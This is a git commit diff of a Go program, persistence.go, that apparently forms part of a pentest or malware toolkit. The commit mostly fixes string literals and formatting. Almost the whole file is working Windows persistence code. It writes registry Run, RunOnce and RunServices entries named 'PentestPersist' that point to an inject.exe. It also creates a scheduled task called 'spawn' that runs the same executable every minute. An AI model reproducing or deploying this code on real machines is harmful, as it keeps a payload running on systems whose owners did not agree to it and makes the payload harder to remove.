cc9bd704ed771e738a6bcd7f4038841d2de603b6
NewComrade12211 <mironovadasha1975@gmail.com>
2024-08-25 14:54:29 +0300

    Update persistence.go

--- persistence.go
+++ persistence.go
@@ -1,51 +1,45 @@
 package main
 
 import (
-    "fmt"
-    "os/exec"
+	"fmt"
+	"os/exec"
 )
 
 const (
-    registry_RUN           = HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
-    registry_RunOnce       = HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
-    registry_RunServices    = HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
-    registry_RunServiceOnce = HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
+	registry_RUN            = `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
+	registry_RunOnce        = `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`
+	registry_RunServices    = `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices`
+	registry_RunServiceOnce = `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
 )
 
 func Add_ToRegistry() {
-    command := func(registry string) {
-        c := exec.Command("cmd", "/C", "reg", "add", registry, "/v", "PentestPersist", "/t", "REG_SZ", "/d", C:\Users\miron\inject.exe)
-        if err := c.Run(); err != nil {
-            fmt.Println("Error: ", err)
-        } else {
-            fmt.Println("[+] Successful add to", registry, "[+]")
-        }
-    }
-
-    command(registry_RUN)
-    command(registry_RunOnce)
-    command(registry_RunServices)
-    command(registry_RunServiceOnce)
+	command := func(registry string) {
+		c := exec.Command("cmd", "/C", "reg", "add", registry, "/v", "PentestPersist", "/t", "REG_SZ", "/d", `C:\Users\miron\inject.exe`)
+		if err := c.Run(); err != nil {
+			fmt.Println("Error: ", err)
+		} else {
+			fmt.Println("[+] Successful add to", registry, "[+]")
+		}
+	}
+	command(registry_RUN)
+	command(registry_RunOnce)
+	command(registry_RunServices)
+	command(registry_RunServiceOnce)
 }
 
-
-func Add_To_Schedule(){
-    command := func() {
-        c := exec.Command("cmd", "/C", "SCHTASKS", "/Create", "/SC", "MINUTE", "/TN", "spawn", "/TR", C:\Users\miron\inject.exe)
-        if err := c.Run(); err != nil {
-            fmt.Println("Error: ", err)
-        } else {
-            fmt.Println("[+] Successful add to Schedule(SCHTASKS)", "[+]")
-        }
-    }
-    command()
-    //SCHTASKS /Create /SC MINUTE /TN spawn /TR C:\windows\system32\cmd.exe /MO 1
-
+func Add_To_Schedule() {
+	command := func() {
+		c := exec.Command("cmd", "/C", "SCHTASKS", "/Create", "/SC", "MINUTE", "/TN", "spawn", "/TR", `C:\Users\miron\inject.exe`)
+		if err := c.Run(); err != nil {
+			fmt.Println("Error: ", err)
+		} else {
+			fmt.Println("[+] Successful add to Schedule(SCHTASKS)", "[+]")
+		}
+	}
+	command()
 }
-
-
 
 func main() {
-    Add_ToRegistry()
-    Add_To_Schedule()
+	Add_ToRegistry()
+	Add_To_Schedule()
 }
